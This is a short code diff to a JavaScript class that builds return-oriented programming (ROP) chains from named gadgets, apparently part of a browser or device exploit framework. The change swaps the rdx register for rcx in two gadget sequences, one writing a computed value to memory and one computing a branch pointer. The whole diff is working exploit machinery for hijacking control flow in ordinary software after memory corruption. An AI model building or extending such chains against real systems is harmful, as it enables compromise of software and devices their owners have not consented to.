@@ -204,9 +204,9 @@ class rop {
         this.push(gadgets["pop rax"]);
         this.push(dest);
         this.push(gadgets["mov rax, [rax]"]);
-        this.push(gadgets["pop rdx"]);
+        this.push(gadgets["pop rcx"]);
         this.push(value);
-        this.push(gadgets["add rax, rdx"]);
+        this.push(gadgets["add rax, rcx"]);
         this.push(gadgets["mov [rdi], rax"]);
     }
 
@@ -249,9 +249,9 @@ class rop {
         }
 
         this.push(gadgets["shl rax, 3"]);
-        this.push(gadgets["pop rdx"]);
+        this.push(gadgets["pop rcx"]);
         this.push(branch_addr);
-        this.push(gadgets["add rax, rdx"]);
+        this.push(gadgets["add rax, rcx"]);
         this.push(gadgets["mov rax, [rax]"]);
         this.push(gadgets["pop rdi"]);
         let branch_pointer_pointer_idx = this.increment_stack();
